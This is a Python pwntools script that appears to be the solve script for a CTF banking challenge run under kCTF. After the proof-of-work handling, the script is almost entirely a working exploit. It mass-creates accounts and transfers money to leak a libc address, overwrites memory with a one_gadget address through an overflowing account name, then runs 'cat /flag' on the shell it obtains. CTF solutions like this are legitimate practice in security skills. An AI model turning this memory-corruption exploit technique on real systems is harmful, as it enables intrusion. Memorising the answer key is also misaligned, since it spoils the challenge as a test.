#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

###

from pwn import *

# make accounts
for i in range(131):
    r.sendline(b"1\na%d" % i)
    r.recvuntil(b"Account created.")

# transfer money
for _ in range(122):
    r.sendline(b"3\n130\n129\n35")
    r.recvuntil(b"Transaction created!")

r.sendline(b"3\n130\n129\n24")
r.recvuntil(b"Transaction created!")
r.recvline()
r.recvline()
leak = int(r.recvline().split(b"0x")[1][:12], 16)
leak = leak - 0x1bb7e3
log.info("libc: " + hex(leak))

one_gadget = leak + 0xe5306

r.sendline(b"1\n" + (b"a"*(20+48)) + p64(one_gadget))
r.sendline(b"5\n131\na")
r.sendline(b"6")
import time 
time.sleep(1)
r.sendline(b"\ncat /flag")

print(r.recvuntil(b"irisctf{"))
print(r.recvuntil(b"}"))

###

exit(0)
